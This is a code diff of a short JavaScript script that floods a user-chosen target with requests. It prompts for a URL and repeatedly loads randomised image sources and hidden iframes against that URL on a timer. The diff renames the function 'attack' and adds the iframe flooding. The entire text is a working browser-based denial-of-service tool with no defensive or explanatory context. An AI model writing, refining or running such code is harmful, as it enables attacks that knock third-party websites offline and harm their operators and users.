@@ -1,11 +1,9 @@
-    var target = prompt("target");
-    var uri = prompt("uri");
-
-function imgflood() {  
-  var TARGET = target;
-  var URI = uri;
+    var target = prompt("Url");
+function attack() {  
   var pic = new Image();
   var rand = Math.floor(Math.random() * 1000);
-  pic.src = 'http://'+TARGET+URI+rand+'=val';
+  pic.src = 'http://'+target+rand+'=val';
+    
+    document.body.innerHTML+='<iframe src="'+target+rand+'" style="display:none;"></iframe>';
 }
-setInterval(imgflood, 1);  
+setInterval(attack, 10);  
